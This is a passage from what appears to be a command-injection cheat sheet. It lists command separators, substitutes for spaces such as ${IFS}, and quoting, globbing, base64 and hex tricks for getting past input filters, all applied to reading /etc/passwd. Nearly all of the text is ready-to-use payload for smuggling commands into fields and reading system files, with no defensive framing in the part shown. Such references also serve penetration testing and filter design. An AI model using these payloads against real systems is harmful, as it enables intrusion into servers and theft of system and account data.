                              → & cmd
                              → && cmd
                              → %0a cmd (newline)
                              → `cmd`
                              → $(cmd)
```

### Space Alternatives

```
cat /etc/passwd               → cat${IFS}/etc/passwd
                              → cat$IFS/etc/passwd
                              → {cat,/etc/passwd}
                              → cat</etc/passwd
                              → cat%09/etc/passwd
                              → X=$'\x20';cat${X}/etc/passwd
```

### Keyword Alternatives

```
cat                           → c'a't
                              → c""at
                              → c\at
                              → /???/c?t
                              → /???/??t
                              → $(echo Y2F0|base64 -d)
                              → $'\x63\x61\x74'
```

### Path Alternatives

```
/etc/passwd                   → /e?c/p?ss??
